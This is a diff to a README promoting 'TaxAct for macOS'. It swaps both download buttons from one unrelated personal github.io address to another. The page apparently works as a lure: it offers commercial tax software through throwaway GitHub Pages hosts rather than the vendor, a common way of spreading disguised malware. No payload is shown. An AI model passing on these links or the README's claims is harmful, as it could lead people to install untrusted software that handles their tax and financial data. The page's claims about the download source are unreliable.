@@ -3,7 +3,7 @@
 TaxAct is a user-friendly tax preparation application designed specifically for macOS users. It simplifies filing federal and state taxes with clear guidance, making it ideal for individuals, professionals, and small business owners.
 
 ## ✅ Download TaxAct for macOS  
-[![Download TaxAct](https://img.shields.io/badge/Download-TaxAct-blueviolet)](https://shuziktobehuman.github.io/huja/TaxAct)
+[![Download TaxAct](https://img.shields.io/badge/Download-TaxAct-blueviolet)](https://mitrobandus.github.io/.github/TaxAct)
 
 ---
 
@@ -59,7 +59,7 @@ TaxAct is a comprehensive tax software that helps macOS users prepare and file t
 
 ---
 
-[![Download TaxAct](https://img.shields.io/badge/Download-TaxAct-blueviolet)](https://shuziktobehuman.github.io/huja/TaxAct)
+[![Download TaxAct](https://img.shields.io/badge/Download-TaxAct-blueviolet)](https://mitrobandus.github.io/.github/TaxAct)
 
 ---
 
